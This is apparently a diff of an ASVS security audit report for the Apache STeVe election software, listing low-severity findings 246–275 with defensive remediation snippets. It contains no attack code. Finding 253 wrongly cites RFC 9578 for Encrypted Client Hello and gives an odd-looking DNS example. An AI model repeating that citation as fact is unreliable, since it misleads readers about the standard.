+Move to module pattern or IIFE with explicit null checks: `(function() { 'use strict'; window.openCreateElectionModal = function() { const el = document.getElementById('electionTitle'); if (!(el instanceof HTMLInputElement)) return; el.value = ''; el.classList.remove('is-invalid'); showModal('createElectionModal'); }; })();`
+
+#### FINDING-246: CSRF token embedded in HTML body rather than Set-Cookie header
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 3.3.4 |
+| Files | v3/server/pages.py:87 |
+| Source Reports | 3.3.4.md |
+| Related Findings | - |
+
+**Description:**
+
+The CSRF token (currently a placeholder `'placeholder'`) is embedded in template output as a hidden form field value. While it's intended to be accessible to client-side JavaScript for AJAX requests (see `manage.ezt` line with `document.getElementById('csrf-token').value`), the current implementation transmits this value in HTML body content rather than exclusively via `Set-Cookie`. However, since CSRF tokens are by definition meant to be used by client-side forms, this is an architectural note rather than a vulnerability. The real risk is that this token is never validated (acknowledged in known false positives as work-in-progress).
+
+**Remediation:**
+
+CSRF tokens are typically embedded in page HTML by design. The primary remediation is to implement actual CSRF token validation rather than changing the transmission mechanism.
+
+---
+
+#### FINDING-247: No validation that session cookie size stays within 4096 bytes
 
 | Attribute | Value |
 |-----------|-------|
 | Severity | 🔵 Low |
 | ASVS Level(s) | L3 |
 | CWE | - |
-| ASVS Section(s) | 3.6.1 |
-| Files | v3/server/pages.py:40-41 |
-| Source Reports | 3.6.1.md |
-| Related Findings | - | **Description:**
+| ASVS Sections | 3.3.5 |
+| Files | v3/server/pages.py:60-90 |
+| Source Reports | 3.3.5.md |
+| Related Findings | - |
 
-The application serves static assets locally via `STATICDIR = THIS_DIR / 'static'` and the `serve_static()` handler. However, the HTML templates (.ezt files in TEMPLATES directory) are not provided for audit. These templates may reference external CDN resources (JavaScript libraries, CSS frameworks like Bootstrap which is referenced in flash message categories, or web fonts) without Subresource Integrity (SRI) attributes. If external resources are loaded without SRI in templates, a CDN compromise could inject malicious JavaScript into the voting application, potentially stealing votes, session tokens, or manipulating election results.
+**Description:**
+
+The application stores flash messages in the session (which is cookie-based in Quart by default). Flash messages are user-visible strings that accumulate in the session until displayed. While individual flash messages are short predefined strings, there is no validation that the total session/cookie size stays within 4096 bytes. Data flow: User performs actions → flash messages accumulate in session → session serialized to cookie → if cookie exceeds 4096 bytes → browser silently drops cookie → user loses session. Low practical risk as flash messages are cleared on page load, and the session data (uid, fullname, email) is typically short. The form.title in flash messages could be long but is transient.
 
 **Remediation:**
 
-1. Audit all .ezt template files for &lt;script src=, <link href=, and @import references to external domains. 2. For any external resources found, add integrity and crossorigin attributes (e.g., <script src="https://cdn.example.com/lib.min.js" integrity="sha384-{hash}" crossorigin="anonymous"&gt;&lt;/script&gt;). 3. Preferably, host all assets locally (which the serve_static handler supports). 4. Document any external resource dependencies and their SRI hashes.
+Add middleware to validate cookie size before setting:
+```python
+@APP.after_request
+async def check_cookie_size(response):
+    for header_name, header_value in response.headers:
+        if header_name.lower() == 'set-cookie':
+            # Parse cookie name and value
+            cookie_content = header_value.split(';')[0]  # name=value part
+            if len(cookie_content.encode('utf-8')) > 4096:
+                _LOGGER.warning(f'Cookie exceeds 4096 bytes: {len(cookie_content)} bytes')
+                # Truncate or handle gracefully
+    return response
+```
+
+---
+
+#### FINDING-248: Single Hostname Configuration With No Evidence of Multi-Application Separation
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 3.5.4 |
+| Files | v3/server/config.yaml.example:entire file |
+| Source Reports | 3.5.4.md |
+| Related Findings | - |
+
+**Description:**
+
+The configuration shows a single server on a single port with TLS certificates for a single hostname. While no multi-application hosting is evident (suggesting this is a standalone application), there is no explicit configuration or documentation that would prevent deployment on a shared hostname with other applications. The OAuth integration references oauth.apache.org as a separate hostname, which is correct practice. The application serves dynamic pages (elections, voting), static files (/static/), document files (/docs/), and authentication flows (/auth) all under a single origin. If co-hosted with other ASF applications on the same hostname, the Same-Origin Policy would not provide separation.
+
+**Remediation:**
+
+Ensure deployment configuration uses a dedicated hostname (e.g., steve.apache.org) rather than a path-based virtual host. Document this requirement.
+
+---
+
+#### FINDING-249: Candidate Data Embedded in Inline Script Within Authenticated HTML Page
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 3.5.7 |
+| Files | v3/server/templates/vote-on.ezt:JavaScript section near bottom |
+| Source Reports | 3.5.7.md |
+| Related Findings | - |
+
+**Description:**
+
+Election data (candidate names, issue titles, seat counts, issue IDs) is embedded in an inline &lt;script&gt; block within the HTML response of an authenticated page. This is NOT a separate .js resource file — it's rendered directly in the HTML document body. This is not a XSSI vulnerability because: (1) The data is in the HTML page itself, not in a separate script resource that could be loaded via &lt;script src="..."&gt;; (2) The page requires authentication (@asfquart.auth.require({R.committer})); (3) Cross-origin script loading would not include session cookies for this inline content; (4) Quart does not set Access-Control-Allow-Origin headers that would permit cross-origin reading. However, if any separate .js endpoint were added in the future that serves this data dynamically, it could become exploitable.
+
+**Remediation:**
+
+No immediate action required. As a defense-in-depth measure, add X-Content-Type-Options to prevent MIME sniffing: @APP.after_request async def security_headers(response): response.headers['X-Content-Type-Options'] = 'nosniff'; return response
+
+---
+
+#### FINDING-250: SRI Integrity Attributes Incomplete
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 3.7.5, 3.6.1 |
+| Files | v3/server/templates/header.ezt:7, v3/server/templates/footer.ezt:14 |
+| Source Reports | 3.7.5.md, 3.6.1.md |
+| Related Findings | - |
+
+**Description:**
+
+SRI (Subresource Integrity) is applied to Bootstrap CSS and JS, and to SortableJS, but NOT to the application's own scripts and stylesheets. While SRI on CDN resources is good practice, the inconsistency means there's no documented behavior for what happens when SRI fails. Missing integrity attributes on bootstrap-icons.css, steve.css, and steve.js mean no integrity verification on application resources. If SRI check fails on resources that do have integrity attributes, the browser blocks loading but the application provides no user-visible explanation. There is no fallback behavior documented or implemented when critical scripts fail to load.
+
+**Remediation:**
+
+Add integrity attributes to all script and style resources including steve.css and steve.js with computed SHA-384 hashes. Implement a global error event handler that listens for error events on SCRIPT and LINK elements, and when detected, replaces document.body.innerHTML with a user-friendly error message stating 'A required resource failed integrity verification. This may indicate a security issue. Please reload the page or contact support.'
+
+---
+
+#### FINDING-251: Election Creation Has No Secondary Approval
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L3 |
+| CWE | CWE-863 |
+| ASVS Sections | 2.3.5 |
+| Files | v3/server/pages.py:410 |
+| Source Reports | 2.3.5.md |
+| Related Findings | FINDING-149 |
+
+**Description:**
+
+While creation itself is not destructive, it's the entry point for the entire election lifecycle. A PMC member could create elections without organizational awareness. This is lower severity as elections must still be opened and closed, and the `R.pmc_member` requirement provides some gatekeeping.
+
+**Remediation:**
+
+Implement multi-user approval workflow for election creation to ensure organizational awareness and oversight before elections enter the lifecycle.
+
+---
+
+#### FINDING-252: Vote Table Schema Lacks Timestamp for Timing Analysis
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L3 |
+| CWE | CWE-778 |
+| ASVS Sections | 2.4.2 |
+| Files | v3/docs/schema.md:148 |
+| Source Reports | 2.4.2.md |
+| Related Findings | FINDING-112 |
+
+**Description:**
+
+The vote table schema lacks a timestamp column, preventing any timing-based analysis or enforcement. This makes it impossible to retroactively detect automated voting patterns or implement minimum interval checks at the database level. The AUTOINCREMENT VID provides ordering but not timing information. Audit logs may have timing info, but it's separated from the vote data.
+
+**Remediation:**
+
+Add created_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now')) column to vote table. Create database trigger to prevent rapid re-voting by checking if vote_token has voted within last 10 seconds and raising ABORT if so.
+
+---
+
+#### FINDING-253: Encrypted Client Hello (ECH) Not Configured
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 12.1.5 |
+| Files | v3/server/main.py, v3/server/config.yaml.example |
+| Source Reports | 12.1.5.md |
+| Related Findings | - |
+
+**Description:**
+
+No ECH (Encrypted Client Hello) configuration exists anywhere in the codebase. Without ECH, the Server Name Indication (SNI) field in the TLS ClientHello is transmitted in plaintext. This allows network observers (ISPs, network administrators, or attackers performing passive surveillance) to determine which hostname the client is connecting to, even though the payload is encrypted. This is a metadata privacy issue. ECH is a TLS 1.3 extension (RFC 9578, formerly ESNI) that is still relatively new and requires DNS infrastructure support, server-side TLS library support, and Python's ssl module does not natively support ECH configuration as of Python 3.12.
+
+**Remediation:**
+
+This is a Level 3 requirement. Implementation requires: 1. Deploy behind a reverse proxy that supports ECH (e.g., Cloudflare, nginx with ECH patches) 2. Publish ECH keys via DNS HTTPS records 3. Document ECH configuration in deployment guides. Example DNS record for ECH support: _443._https.steve.apache.org. IN HTTPS 1 . ech="&lt;base64-encoded ECH config&gt;"
+
+---
+
+#### FINDING-254: LDAP Connection Security Not Verified in Architecture
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 12.3.1 |
+| Files | v3/docs/quickstart.md:38-44, v3/ARCHITECTURE.md |
+| Source Reports | 12.3.1.md |
+| Related Findings | - |
+
+**Description:**
+
+The system connects to an LDAP server for user data loading via the asf-load-ldap.py script. There is no documentation indicating whether: (1) LDAPS (LDAP over TLS) or StartTLS is used, (2) Certificate validation is performed, or (3) Credentials in bind.txt are transmitted securely. If LDAP connections use plaintext LDAP (port 389) without StartTLS, credentials and user data are transmitted unencrypted.
+
+**Remediation:**
+
+Ensure the LDAP loading script uses LDAPS (port 636) or StartTLS with certificate validation enabled. Document this requirement in the deployment and quickstart guides. Verify the asf-load-ldap.py script implementation to confirm secure LDAP connection configuration.
+
+---
+
+#### FINDING-255: No Documented Enforcement of TLS Between Application and Reverse Proxy
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L2, L3 |
+| CWE | - |
+| ASVS Sections | 12.3.3, 12.3.5 |
+| Files | v3/ARCHITECTURE.md, v3/server/config.yaml.example:22 |
+| Source Reports | 12.3.3.md, 12.3.5.md |
+| Related Findings | - |
+
+**Description:**
+
+The architecture is primarily a monolithic application (Quart web server + SQLite file database) with minimal service-to-service communication. However, there are identifiable communication paths: 1. Reverse proxy → Application server: No mutual TLS; the proxy authenticates to the backend only via network connectivity (no client certificate) 2. Application → OAuth provider (oauth.apache.org): Standard TLS, no client certificate authentication 3. Application → LDAP server: Authentication via bind credentials in bind.txt, no evidence of mTLS. The system does not implement: TLS client certificate authentication, Service mesh, API keys or tokens for service-to-service authentication, Replay attack prevention for internal calls. At Level 3, the absence of mutual TLS means internal services cannot cryptographically verify each other's identity. An attacker with network access could potentially impersonate internal services. However, given the monolithic architecture with SQLite (no network database), the attack surface is limited.
+
+**Remediation:**
+
+For a Level 3 deployment, add mTLS support in main.py: import ssl; ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH); ssl_context.load_cert_chain(certfile=CERTS_DIR / 'server.pem', keyfile=CERTS_DIR / 'server-key.pem'); ssl_context.load_verify_locations(cafile=CERTS_DIR / 'internal-ca.pem'); ssl_context.verify_mode = ssl.CERT_REQUIRED; app.runx(port=app.cfg.server.port, ssl=ssl_context). Or consider a service mesh (e.g., Istio, Linkerd) if the architecture evolves to microservices.
+
+---
+
+#### FINDING-256: SQLite database access lacks authentication mechanism
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 13.2.1 |
+| Files | v3/steve/election.py:35-37, v3/steve/persondb.py:25-26 |
+| Source Reports | 13.2.1.md |
+| Related Findings | - |
+
+**Description:**
+
+Communications between application components and the SQLite database do not use any authentication mechanism. The database is accessed via file path with no credentials. SQLite is a file-based database and does not natively support user authentication. Access control depends entirely on file system permissions. This is classified as LOW because SQLite's embedded nature means it runs in-process and is not a network service. However, the requirement applies to 'data layers' which includes databases. The application relies solely on OS file permissions rather than cryptographic authentication. Data Flow: Application process → file system → steve.db → no authentication layer. If the file system permissions are misconfigured, any process on the same host could read or modify election data, cryptographic salts, and encrypted votes.
+
+**Remediation:**
+
+For SQLite specifically: Document that file system permissions serve as the authentication mechanism; Ensure the database file has restrictive permissions (e.g., 0600, owned by the application service account); Consider SQLite encryption extensions (e.g., SQLCipher) for data-at-rest protection; If migrating to a networked database, implement service account authentication with short-term credentials
+
+---
+
+#### FINDING-257: Email service communication lacks documented authentication configuration
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 13.2.1 |
+| Files | v3/server/bin/mail-voters.py:67-73 |
+| Source Reports | 13.2.1.md |
+| Related Findings | - |
+
+**Description:**
+
+The email sending function does not show explicit SMTP authentication. The comment '# Add other parameters as needed (e.g., auth, headers)' suggests authentication is not yet configured. The asfpy.messaging library may handle this internally, but it is not documented or visible in this codebase. If SMTP authentication is not configured, the application may be relying on network-level trust (e.g., sending from within the same network as the mail relay) which could be spoofed or abused.
+
+**Remediation:**
+
+Document SMTP authentication method and ensure it uses short-term tokens or certificate-based authentication rather than static passwords.
+
+---
+
+#### FINDING-258: CLI scripts run without documented privilege requirements
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 13.2.2 |
+| Files | v3/server/bin/create-election.py, v3/server/bin/mail-voters.py |
+| Source Reports | 13.2.2.md |
+| Related Findings | - |
+
+**Description:**
+
+Command-line utilities that directly modify the database or send emails have no documented OS-level privilege requirements or access controls. create-election.py can create elections and add voters, while mail-voters.py can read voter emails and send messages. These scripts have the same database privileges as the web server but no authentication or authorization layer. Anyone with shell access to the server can create elections, modify voter rolls, or send emails to voters without audit trail beyond system-level logging.
+
+**Remediation:**
+
+Document required OS permissions and consider adding authentication checks or restricted execution contexts for CLI tools.
+
+---
+
+#### FINDING-259: No evidence of server-level allowlist configuration for outbound requests or file access
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 13.2.5 |
+| Files | Application-wide (configuration gap), election.py:445 |
+| Source Reports | 13.2.5.md |
+| Related Findings | - |
+
+**Description:**
+
+The codebase does not contain any server-level configuration defining which resources or systems the server can send requests to or load data from. While the application primarily uses local SQLite databases and local file system access, there is no evidence of: Web server configuration restricting outbound connections, Application-level configuration restricting file system access paths, or Network-level allowlist documentation. If the application is extended to make outbound requests (e.g., for email notifications as suggested by the get_voters_for_email() method in election.py line 445), there would be no allowlist to prevent SSRF or unauthorized outbound communication.
+
+**Remediation:**
+
+In application configuration, define ALLOWED_FILE_PATHS dictionary containing 'database', 'templates', 'static', and 'docs' paths. At server-level, configure reverse proxy (e.g., nginx) to restrict outbound connections. Add iptables/firewall rules to whitelist only necessary outbound destinations.
+
+---
+
+#### FINDING-260: Ad-hoc database connections opened in request handlers without connection lifecycle management
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 13.2.6 |
+| Files | v3/server/pages.py:233, v3/server/pages.py:295, v3/server/pages.py:435, v3/server/pages.py:567 |
+| Source Reports | 13.2.6.md |
+| Related Findings | - |
+
+**Description:**
+
+Multiple database connections are opened per request without explicit closing or connection pooling. Comments in the code acknowledge this issue with '### should open/keep a PersonDB instance in the APP'. Connections are opened at lines 233, 295, 435, and 567 in pages.py without proper lifecycle management.
+
+**Remediation:**
+
+Implement a connection pool or application-level singleton for database access with proper lifecycle management. Replace ad-hoc open_database() calls with an application-level connection pool with documented configuration for timeouts, max connections, and retry behavior.
+
+---
+
+#### FINDING-261: Commented-out debug print statements expose critical key material if uncommented
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 13.4.2 |
+| Files | v3/steve/election.py:79, v3/steve/election.py:83 |
+| Source Reports | 13.4.2.md |
+| Related Findings | - |
+
+**Description:**
+
+While these debug print statements are currently commented out, their presence indicates a pattern of uncommenting for debugging. If accidentally uncommented in production, they would expose critical key material (salt, opened_key, election data) to stdout/logs.
+
+**Remediation:**
+
+Remove all commented-out debug print statements. Use structured logging with appropriate log levels that can be configured per environment.
+
+---
+
+#### FINDING-262: Directory Listing Protection Depends on Deployment Configuration
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 13.4.3 |
+| Files | v3/server/pages.py:560-574, v3/server/pages.py:577-578 |
+| Source Reports | 13.4.3.md |
+| Related Findings | - |
+
+**Description:**
+
+While Quart's send_from_directory() does NOT generate directory listings by default (it requires a specific filename), the application does not explicitly configure or document that directory listing is disabled at the web server level if deployed behind a reverse proxy (nginx, Apache). If the application is deployed behind a web server that has autoindex enabled, directories could be listed. This is a LOW finding because: 1. Quart/Flask's send_from_directory does not serve directory listings, 2. Requests without a filename would not match these route patterns, 3. The actual risk depends on the deployment infrastructure (reverse proxy configuration)
+
+**Remediation:**
+
+Document deployment requirements to ensure directory listing is disabled at all levels. Add explicit handling for directory access attempts with a 404 error handler, or add middleware to reject requests ending in / for static and docs paths. Example: Add @APP.errorhandler(404) handler or @APP.before_request middleware to block directory requests that end with '/' for /static/ and /docs/ paths.
+
+---
+
+#### FINDING-263: No Explicit HTTP TRACE Method Blocking
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 13.4.4 |
+| Files | v3/server/pages.py:125-583 |
+| Source Reports | 13.4.4.md |
+| Related Findings | - |
+
+**Description:**
+
+The application uses Quart framework route decorators (@APP.get(), @APP.post()) which only respond to explicitly specified HTTP methods. There is no explicit TRACE handler defined, and Quart (built on Werkzeug routing) will respond with 405 Method Not Allowed for unsupported methods. However, there is no explicit middleware or configuration to block TRACE at the application level. If deployed behind a reverse proxy that passes TRACE through, or if future framework changes alter default behavior, TRACE could become available. The risk is LOW because the framework's default behavior is correct.
+
+**Remediation:**
+
+Add explicit TRACE blocking for defense-in-depth: Add a before_request handler to block TRACE method explicitly (@APP.before_request async def block_trace(): if quart.request.method == 'TRACE': quart.abort(405)). Or configure at the reverse proxy level (preferred) using nginx configuration: if ($request_method = TRACE) { return 405; }
+
+---
+
+#### FINDING-264: No Explicit Framework Endpoint Restriction Visible for asfquart Built-in Routes
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 13.4.5 |
+| Files | v3/server/main.py:34 |
+| Source Reports | 13.4.5.md |
+| Related Findings | - |
+
+**Description:**
+
+Application startup sets root logger and app logger to DEBUG level in all modes, including production ASGI. Debug-level logging in production ASGI mode may expose internal state, request parameters, framework internals, and cryptographic operation details to log collectors or monitoring systems that aggregate logs. While not an endpoint per se, log aggregation systems (ELK, Splunk, CloudWatch) often expose search interfaces that become de facto monitoring endpoints. Any request processed by the server will generate DEBUG-level log entries containing internal processing details, framework routing decisions, and potentially session data.
+
+**Remediation:**
+
+After app construction, explicitly verify registered routes and remove any unintended ones. If framework exposes introspection: app.config['EXPLAIN_TEMPLATE_LOADING'] = False; Remove any health/status endpoints not intended for public access. Audit asfquart framework for any built-in documentation, debugging, or monitoring endpoints that may be registered by default.
+
+---
+
+#### FINDING-265: Internal Code Comments Reveal Migration Plans and Technology Stack
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 13.4.6 |
+| Files | v3/steve/crypto.py:58-69 |
+| Source Reports | 13.4.6.md |
+| Related Findings | - |
+
+**Description:**
+
+Source code → if exposed (e.g., via .git directory, backup file, or error page with stack trace) → attacker learns cryptographic implementation details and migration timeline. The comments explicitly state the current encryption scheme (Fernet), planned future scheme (XChaCha20-Poly1305), and that it hasn't been migrated yet. If source code is inadvertently exposed, this provides cryptographic implementation intelligence. The info=b'xchacha20_key' parameter is also a technology indicator embedded in the ciphertext derivation chain. This is LOW severity because it requires source code exposure first, which is addressed by other controls.
+
+**Remediation:**
+
+Ensure deployment processes strip comments and that no source files are accessible via the web tier (see 13.4.7). Review whether info=b'xchacha20_key' should be updated to a non-descriptive value like b'vote_key_v1'.
+
+---
+
+#### FINDING-266: State-changing operations using GET requests expose operation context in URL history
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L1 |
+| CWE | - |
+| ASVS Sections | 14.2.1 |
+| Files | v3/server/pages.py:do_open_endpoint, v3/server/pages.py:do_close_endpoint |
+| Source Reports | 14.2.1.md |
+| Related Findings | - |
+
+**Description:**
+
+While EIDs are not themselves highly sensitive data (they're designed as semi-public identifiers with authorization checks), performing state-changing operations via GET means: 1. The operation URL appears in browser history 2. Proxy/CDN logs record the action with the EID 3. Browser prefetching or link scanners could inadvertently trigger the operation 4. Referer headers may leak the EID to subsequent navigation targets. The EIDs themselves are 40-bit entropy identifiers protected by authorization (per known false positive patterns), so the actual data exposure risk is low. However, using GET for state-changing operations is architecturally inappropriate.
+
+**Remediation:**
+
+Convert to POST requests: @APP.post('/do-open/&lt;eid&gt;') @asfquart.auth.require({R.committer}) @load_election async def do_open_endpoint(election): ...
+
+---
+
+#### FINDING-267: Non-cryptographic PRNG used for candidate ordering in voting interface
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 14.2.4 |
+| Files | v3/server/pages.py:vote_on_page |
+| Source Reports | 14.2.4.md |
+| Related Findings | - |
+
+**Description:**
+
+The application uses `random.shuffle()` (Mersenne Twister, predictable) instead of the available cryptographically secure `crypto.shuffle()` function for shuffling candidates in the voting interface. While candidate names are public information, the ordering presented to voters can influence voting behavior (primacy/recency effects). Using a predictable PRNG means: 1. An attacker who knows the random seed could predict candidate ordering 2. The shuffle quality is lower than the cryptographic alternative already available 3. Inconsistency in security posture — the tally code uses `crypto.shuffle()` but the presentation code uses `random.shuffle()`. Data flow: Candidate list → `random.shuffle()` (Mersenne Twister, predictable) → Presented to voter → Potential ordering bias. Gap Type: Type B — Control EXISTS (`crypto.shuffle`) but NOT CALLED (uses `random.shuffle` instead)
+
+**Remediation:**
+
+Replace `random.shuffle(issue.candidates)` with `steve.crypto.shuffle(issue.candidates)`
+
+---
+
+#### FINDING-268: No data retention controls implemented for closed elections
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L2, L3 |
+| CWE | - |
+| ASVS Sections | 14.2.4, 14.2.7 |
+| Files | v3/steve/election.py, v3/schema.sql, v3/docs/schema.md |
+| Source Reports | 14.2.4.md, 14.2.7.md |
+| Related Findings | - |
+
+**Description:**
+
+There is no mechanism to enforce data retention policies for: closed elections and their associated votes, superseded votes (re-votes where old vote records are retained), person records for individuals no longer in LDAP, decrypted vote data after tallying. The schema documentation states 'Older votes are retained for auditing' but provides no retention limit or purge mechanism. Without retention controls: encrypted vote data persists indefinitely, increasing the risk window for future cryptographic breaks; per-voter salts persist indefinitely, maintaining the ability to link voters to votes; the database grows unboundedly; compliance with privacy regulations requiring data minimization cannot be demonstrated.
+
+**Remediation:**
+
+Implement retention lifecycle with methods such as `purge_old_votes()` to remove superseded votes (keep only latest per vote_token), and `archive_and_purge(retention_days=90)` to archive and purge closed election data after retention period, including removing salts and vote_tokens. Additionally, document retention policy in schema.md covering superseded votes, election salts and keys, closed election data, and person records.
+
+---
+
+#### FINDING-269: User email included in every page template context
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 14.2.6 |
+| Files | v3/server/pages.py:87 |
+| Source Reports | 14.2.6.md |
+| Related Findings | - |
+
+**Description:**
+
+User's email is included in every page's template context via basic_info() which is called for every page. If templates render this data, it appears on every page even where not needed. This is a minor over-exposure of personal data.
+
+**Remediation:**
+
+Only include email in template context where it's specifically needed (e.g., profile page). Remove email from the basic_info() function and add it selectively to page contexts that require it.
+
+---
+
+#### FINDING-270: No Data Lifecycle Management Function for Closed Elections
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 14.2.7 |
+| Files | v3/steve/election.py:441-451 |
+| Source Reports | 14.2.7.md |
+| Related Findings | - |
+
+**Description:**
+
+While the function list_closed_election_ids() exists to list closed elections (potentially for administrative purposes), there is no corresponding deletion or archival function. The function supports identifying elections but provides no lifecycle management capability to enforce data retention schedules.
+
+**Remediation:**
+
+Implement a companion function for data lifecycle management: @classmethod def archive_old_elections(cls, db_fname, max_age_days=365): """Archive and delete elections older than max_age_days after closing.""" # Export to archive, then delete pass
+
+---
+
+#### FINDING-271: Documents Served Without Metadata Stripping
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 14.2.8 |
+| Files | v3/server/pages.py:605-620 |
+| Source Reports | 14.2.8.md |
+| Related Findings | - |
+
+**Description:**
+
+Documents served from DOCSDIR are returned without any metadata stripping. If these documents were originally submitted by users (e.g., election administrators uploading issue descriptions, candidate information), they may contain: EXIF data with GPS coordinates, device info, timestamps; Office document metadata (author name, revision history, internal paths); PDF metadata (author, creation tool, modification dates). However, the provided code does not show a file upload mechanism—documents appear to be admin-placed. If there is a separate upload mechanism not shown here, this is more critical.
+
+**Remediation:**
+
+Implement metadata stripping for uploaded files before storing. Use exiftool or similar libraries to remove metadata from images, PDFs, and office documents. Example: Use subprocess to call exiftool with '-all=' flag for JPG, PNG, GIF, TIFF, and PDF files. Add handlers for other file types as needed. Additionally, implement user consent mechanism for metadata storage if metadata needs to be retained.
+
+---
+
+#### FINDING-272: Flash Messages in Session Cookie May Expose Election Titles
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 14.3.3 |
+| Files | v3/server/pages.py:443, v3/server/pages.py:466, v3/server/pages.py:485, v3/server/pages.py:510, v3/server/pages.py:534, v3/server/pages.py:554 |
+| Source Reports | 14.3.3.md |
+| Related Findings | - |
+
+**Description:**
+
+Flash messages containing election and issue titles are stored in the session, which in Quart/Flask typically means they are stored in client-side session cookies. While election titles are not strictly sensitive data, they could reveal information about private or confidential elections. Flash messages include election creation, opening, closing, and issue management operations.
+
+**Remediation:**
+
+Replace flash messages containing election/issue titles with generic success messages that do not include potentially sensitive details. For example, use 'Election created successfully.' instead of 'Created election: {form.title}'.
+
+---
+
+#### FINDING-273: No resource management or resilience dependencies declared
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 15.2.2 |
+| Files | v3/pyproject.toml:10-17 |
+| Source Reports | 15.2.2.md |
+| Related Findings | - |
+
+**Description:**
+
+The dependency list contains no libraries providing resource management controls such as async task timeouts (e.g., asyncio-timeout, async-timeout), connection pooling with limits, circuit breakers (e.g., circuitbreaker, tenacity with limits), or request size limiting middleware. The cryptography library and argon2-cffi are CPU-intensive by design (particularly Argon2 hashing). Without documented resource constraints at the application level, repeated invocation of these operations could degrade availability. Per the known false positive patterns, lack of rate limiting on vote submission is intentional since voters are authenticated ASF committers. This finding is limited to noting the absence of any resource-bounding library in the dependency manifest. The actual application code (not provided) may implement timeouts or resource limits natively via asyncio.
+
+**Remediation:**
+
+Document the security decision regarding resource-demanding functionality (Argon2 hashing, Fernet encryption/decryption). If not already present, consider adding application-level timeouts using asyncio.timeout to wrap resource-intensive operations with a 5-second timeout or similar appropriate limit.
+
+---
+
+#### FINDING-274: Version constraints allow wide range of acceptable versions
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 15.2.4 |
+| Files | v3/pyproject.toml:10-17 |
+| Source Reports | 15.2.4.md |
+| Related Findings | - |
+
+**Description:**
+
+Four of six dependencies (`asfpy`, `asfquart`, `ezt`, `easydict`) have no upper version bound. While this is common practice, it means a future major version with breaking changes or a compromised release could be automatically pulled. The security-critical packages (`cryptography`, `argon2-cffi`) are properly bounded, which is a positive pattern. Impact: Low — primarily a supply chain management concern. A lock file (if maintained outside this audit scope) would mitigate this.
+
+**Remediation:**
+
+Add upper bounds to all dependencies or ensure a lock file is maintained and committed. Example: `asfpy>=0.56,<1`, `asfquart>=0.1.12,<1`, `ezt>=1.1,<2`, `easydict>=1.13,<2`.
+
+---
+
+#### FINDING-275: No evidence of isolation mechanisms for cryptographic operations
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🔵 Low |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 15.2.5 |
+| Files | v3/pyproject.toml |
+| Source Reports | 15.2.5.md |
+| Related Findings | - |
+
+**Description:**
+
